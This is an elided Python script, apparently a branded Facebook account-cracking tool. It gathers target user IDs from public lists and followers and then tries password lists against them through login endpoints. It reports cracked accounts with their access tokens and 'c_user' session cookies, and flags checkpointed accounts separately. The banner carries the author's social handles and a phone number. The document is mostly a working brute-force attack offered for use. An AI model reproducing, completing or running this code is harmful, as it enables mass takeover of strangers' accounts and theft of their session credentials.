...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 JANI IS BACK🔥].  ║

\x1b[0;33m║       #TOOL AUTHOR [JANI 906] PAKISTANI KING. ║
...
\x1b[0;33m║#YOUTUBE :JANI TECHNICAL CHANNEL 😐.  ║

\x1b[0;33m║#FACEBOOK : NAME [ALI TAHIR].       ║

\x1b[0;33m║#GITHUB : https://github.com/MRJANI.   ║

\x1b[0;33m║#WHATSAPP :+923104226803.                   ║
...
def menu():
	...
	elif Bilal == "1" or JANI == "01":

		publik()

		method()

	elif Bilal == "2" or JANI == "02":

		follower()

		method()

	elif Bilal == "3" or  JANI == "03":

		massal()

		method()

	elif AWAIS == "4" or JANI == "04":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mJANI PRO/FASTER \033[1;97m]")
	...
	if method == "":
		...
		ask = raw_input("\033[1;96m[\033[1;94m03\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/n\033[1;97m [ \033[1;96mDefault : n \033[1;97m] ")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[JANI-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[JANI-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[JANI-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[AWAIS-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;95m[JANI-CP] %s|%s\033[0;91m        "%(uid, pw))
